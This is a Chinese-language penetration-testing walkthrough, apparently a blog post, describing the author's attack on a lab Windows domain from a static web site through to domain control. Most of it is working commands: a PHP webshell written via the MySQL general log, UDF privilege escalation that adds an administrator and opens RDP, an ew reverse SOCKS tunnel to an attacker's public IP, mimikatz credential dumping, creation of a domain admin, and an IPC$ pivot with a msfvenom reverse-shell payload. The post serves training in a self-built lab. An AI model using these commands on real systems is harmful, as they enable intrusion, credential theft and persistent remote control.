<h2 id="0x01-渗透环境"><a href="#0x01-渗透环境" class="headerlink" title="0x01. 渗透环境"></a>0x01. 渗透环境</h2><h4 id="emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"><a href="#emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。" class="headerlink" title="&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"></a>&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。</h4><h4 id="emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："><a href="#emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：" class="headerlink" title="&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："></a>&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519102901_yt92TP_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02. web渗透"></a>0x02. web渗透</h2><h4 id="emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"><a href="#emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！" class="headerlink" title="&emsp;&emsp;首先打开我们获取的web站点地址http://192.168.1.106 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"></a>&emsp;&emsp;首先打开我们获取的web站点地址<a href="http://192.168.1.106" target="_blank" rel="external">http://192.168.1.106</a> 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519103537_TL8yGs_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519104344_KmT5nJ_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。"><a href="#emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。" class="headerlink" title="&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。"></a>&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。</h4><h4 id="emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"><a href="#emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。" class="headerlink" title="&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"></a>&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519105043_4G3NCI_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。"><a href="#emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。" class="headerlink" title="&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。"></a>&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110155_HASASl_Screenshot.jpeg" alt=""></p>
<h4 id="拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"><a href="#拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。" class="headerlink" title="拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"></a>拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110834_n7WMwd_Screenshot.jpeg" alt=""></p>
<h4 id="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！"><a href="#大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！" class="headerlink" title="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！"></a>大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set global general_log=&apos;on&apos;;</div><div class="line">set global general_log_file=&apos;G:/apm/apache2/htdocs/config.php&apos;;</div><div class="line">select &quot;&lt;?php ($_=@$_GET[a]).@$_($_POST[&apos;cmd&apos;]); ?&gt;&quot;;</div><div class="line">set global general_log=off;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519111553_ytsySz_Screenshot.jpeg" alt=""></p>
<h4 id="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"><a href="#既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！" class="headerlink" title="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"></a>既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！</h4><blockquote>
<p>url = <a href="http://192.168.1.106/config.php?a=assert" target="_blank" rel="external">http://192.168.1.106/config.php?a=assert</a>  post=cmd</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519112536_9JPgYj_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-数据库提权"><a href="#0x03-数据库提权" class="headerlink" title="0x03. 数据库提权"></a>0x03. 数据库提权</h2><h4 id="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。"><a href="#既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。" class="headerlink" title="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。"></a>既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。</h4><h4 id="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"><a href="#写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！" class="headerlink" title="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"></a>写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;test&apos;@&apos;%&apos; IDENTIFIED BY &apos;mysqltoor&apos; WITH GRANT OPTION; </div><div class="line">FLUSH PRIVILEGES;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113453_p5Fe1K_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113558_iSlUo0_Screenshot.jpeg" alt=""></p>
<h4 id="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"><a href="#现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！" class="headerlink" title="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"></a>现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user test admin@123 /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators /add test&apos;);</div><div class="line">drop function cmdshell;</div><div class="line"></div><div class="line">Create Function open3389 returns string soname &apos;udf.dll&apos;;</div><div class="line">select open3389();</div><div class="line">drop function open3389;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519114403_RJqz70_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-建立隧道"><a href="#0x04-建立隧道" class="headerlink" title="0x04. 建立隧道"></a>0x04. 建立隧道</h2><h4 id="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"><a href="#虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！" class="headerlink" title="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"></a>虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 攻击者在公网IP上 运行：</div><div class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888  //在公网上侦听1080端口，并把来自1080端口的流量重定向到8888端口</div><div class="line"># 受害者运行:</div><div class="line">ew_for_Win.exe -s rssocks -d [攻击者公网IP] -e 8888   </div><div class="line"># 然后 vim /etc/proxychains.conf 配置代理文件为：</div><div class="line">socks5 [攻击者公网IP] 1080     </div><div class="line"># 最后利用proxychains 执行命令</div><div class="line">proxychains rdesktop [受害者IP]:3389</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120038_IAO2LB_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120254_Dzvr86_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120601_zj3thc_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-密码窃取"><a href="#0x05-密码窃取" class="headerlink" title="0x05. 密码窃取"></a>0x05. 密码窃取</h2><h4 id="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin"><a href="#我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin" class="headerlink" title="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@"></a>我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">sekurlsa::logonpasswords</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519121717_XCuZPm_Screenshot.jpeg" alt=""></p>
<h4 id="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"><a href="#拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！" class="headerlink" title="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"></a>拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 收集域名信息</div><div class="line">net view  						//获取当前组的计算机名字</div><div class="line">net view /domain   			//查看所有域</div><div class="line">ping -n 1 [组计算机明] -4  	//从计算机名获取IP 地址</div><div class="line">net user /domain				//查看域中的用户名</div><div class="line">net group /domain				//查看域组名称</div><div class="line">net group &quot;Domain Admins&quot; /domain     				//查询管理员</div><div class="line">net group &quot;Domain controllers&quot;  /domain           //查询域控</div><div class="line">net group &quot;Domain Computers&quot; /domain				//查询所有计算机名字</div><div class="line">net config Workstation								//查看当前计算机名、全名、用户名、系统版本、工作站域、登录域</div><div class="line">net group &quot;Domain controllers&quot; 						//查看域控制器</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">net user admin Ad123test /add /domain	  			//添加普通域用户</div><div class="line">net group &quot;Domain Admins&quot; admin /add /domain 		//提升到域管理员</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519141307_QYTX7T_Screenshot.jpeg" alt=""></p>
<h4 id="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。"><a href="#上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。" class="headerlink" title="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。"></a>上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。</h4><h2 id="0x06-IPC-入侵"><a href="#0x06-IPC-入侵" class="headerlink" title="0x06. IPC$ 入侵"></a>0x06. IPC$ 入侵</h2><h4 id="这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell"><a href="#这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell" class="headerlink" title="这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell."></a>这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4444 -f exe -o msf.exe	\\利用msf生成木马</div><div class="line">net use \\dmember1\ipc$                 //建立ipc$空连接</div><div class="line">copy c:\msf.exe \\dmember1\c$\msf.exe		//拷贝木马到目标机器上面去</div><div class="line">net time \\dmember1						//查看目标的时间</div><div class="line">at \\dmember1 2:35 %path%\msf.exe		//利用at任务执行木马，记住删除任务</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519143905_hSTWQg_Screenshot.jpeg" alt=""></p>
<h4 id="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"><a href="#现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。" class="headerlink" title="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"></a>现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519144432_cknEUr_Screenshot.jpeg" alt=""></p>
